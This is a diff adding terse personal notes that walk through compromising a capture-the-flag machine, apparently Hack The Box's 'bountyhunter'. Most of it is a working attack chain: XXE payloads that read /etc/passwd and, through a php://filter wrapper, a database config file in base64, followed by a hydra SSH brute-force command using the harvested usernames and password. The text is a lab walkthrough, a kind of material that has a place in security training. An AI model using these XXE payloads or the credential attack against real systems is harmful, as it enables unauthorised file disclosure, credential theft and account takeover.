@@ -1,0 +1,47 @@
+open burp
+
+in firefox console, while in portal
+
+var xml = `<?xml  version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+        <bugreport>
+        <title>&xxe;</title>
+        <cwe>something</cwe>
+        <cvss>something</cvss>
+        <reward>something</reward>
+        </bugreport>`
+
+returnSecret(btoa(xml))
+
+then send request to repeater and send.
+
+
+while reading /etc/passwd...... /home/development
+
+Copy the content of /etc/passwd in users.txt for future HYDRA test
+
+ 
+now, we'll get the DB
+
+var xml = `<?xml  version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/db.php"> ]>
+        <bugreport>
+        <title>&xxe;</title>
+        <cwe>something</cwe>
+        <cvss>something</cvss>
+        <reward>something</reward>
+        </bugreport>`
+
+returnSecret(btoa(xml))
+
+intercept and send to repeater, then copy the result and decode in base64
+
+Now, we'll test the found passwd with hydra.
+
+hydra -L users.txt -p insertpassword bountyhunter.htb ssh
+
+
+now we got the login user and pass, SSH into it... PWNED!
+
+cat user.txt
+
